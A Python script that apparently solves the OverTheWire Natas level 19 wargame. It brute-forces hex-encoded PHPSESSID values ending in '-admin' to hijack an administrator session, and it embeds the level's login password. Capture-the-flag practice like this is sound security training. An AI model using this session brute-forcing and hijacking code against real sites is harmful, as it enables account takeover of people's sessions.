import requests, itertools

user = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
url = f"http://{user}.natas.labs.overthewire.org"

def bruteforce_session_ids(session, possibilites):
    for number_tuple in possibilites:
        sess_id = "".join(str(number) for number in number_tuple) #Join integers to string
        sess_id += "2d" #static separator
        sess_id += "61646d696e" #Ascii representation of 'admin'

        print(f"Testing: {sess_id}")
        cookies = {"PHPSESSID" : sess_id}
        resp = session.post(url, cookies=cookies) #Try to hijack the session.

        if(not "regular user" in resp.text):
            print(resp.text)
            print(f"Admin cookie: {sess_id}")
            exit("Terminating after successful attack")
        
    return False    


with requests.Session() as session:
    session.auth = (user, password)
    auth = session.post(url)

    possibleNumbers = [30, 31, 32, 33, 34, 35, 36, 37, 38, 39] 

    combinations_of_one = list(itertools.product(possibleNumbers, repeat=1))
    combinations_of_two = list(itertools.product(possibleNumbers, repeat=2))
    combinations_of_three = list(itertools.product(possibleNumbers, repeat=3))

    bruteforce_session_ids(session, combinations_of_one)
    bruteforce_session_ids(session, combinations_of_two)
    bruteforce_session_ids(session, combinations_of_three)
